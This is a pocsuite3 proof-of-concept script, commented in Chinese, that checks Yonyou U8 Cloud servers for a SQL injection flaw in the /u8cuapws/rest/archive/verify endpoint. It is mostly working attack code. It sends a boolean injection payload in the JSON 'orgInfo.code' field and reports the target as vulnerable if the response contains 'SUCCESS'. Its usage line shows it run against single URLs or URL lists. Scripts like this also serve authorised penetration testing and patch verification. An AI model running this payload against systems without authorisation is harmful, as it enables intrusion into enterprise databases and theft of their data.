'''
Date: 2024-02-06 14:58:00
LastEditTime: 2024-02-06 15:03:55
FilePath: \用友\用友U8C-ArchiveVerify.py
Description: 

Copyright (c) 2024 by ${git_name_email}, All Rights Reserved. 
'''


from collections import OrderedDict
import re,random,hashlib
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2024-02-06'  #漏洞公开的时间,不知道就写今天
    createDate = '2024-02-06'  # 编写 PoC 的日期
    updateDate = '2024-02-06'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '用友U8 cloud'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = '用友U8 cloud'  # 漏洞应用名称
    appVersion = '''ALl'''  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        用友U8 cloud是用友推出的企业上云数字化平台，该产品/u8cuapws/rest/archive/verify接口处存在SQL注入漏洞，攻击者可通过该漏洞获取数据库权限。
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    def _verify(self):
        result = {}
        try:
            path = '/u8cuapws/rest/archive/verify'
            url = self.url + path
            header = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
            }
            data = {"orgInfo":{"code": "1' OR len(db_name())=7--"}}
            resq = requests.post(url=url,headers=header,json=data,timeout=5)
            if 'SUCCESS' in resq.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url + path
           
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)